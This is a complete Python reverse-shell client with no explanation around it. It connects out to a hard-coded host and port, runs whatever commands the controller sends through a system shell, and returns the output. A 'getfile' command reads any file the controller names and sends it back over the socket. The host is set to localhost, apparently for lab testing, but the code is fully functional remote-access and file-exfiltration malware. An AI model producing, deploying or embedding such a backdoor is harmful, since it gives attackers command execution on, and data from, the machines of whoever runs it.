import os
import socket
import subprocess
from time import sleep

HOST = '127.0.0.1'
PORT = 9999

s = socket.socket()

def main():
    try:
        s.connect((HOST, PORT))
        session()
    except:
        sleep(500)
        s.connect((HOST, PORT))
        session()

def session():
    while True:
        data = s.recv(1024)
        cmd = str(data, encoding="utf-8", errors="ignore")

        if cmd == 'shutdown':
            s.close()
            exit(0)

        elif cmd[:7] == "getfile":
            try:
                f = open(cmd[8:], "rb")
                data_to_send = f.read()
                s.send(bytes(data_to_send))
                f.close()
                s.send(bytes("\nFile has been sent\n" + "\n", encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif cmd == "cd":
            try:
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif len(cmd) > 0:
            try:
                command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = command.stdout.read() + command.stderr.read()
                output_str = str(output_byte, "utf-8", errors="ignore")
                s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))


if __name__ == '__main__':
    main()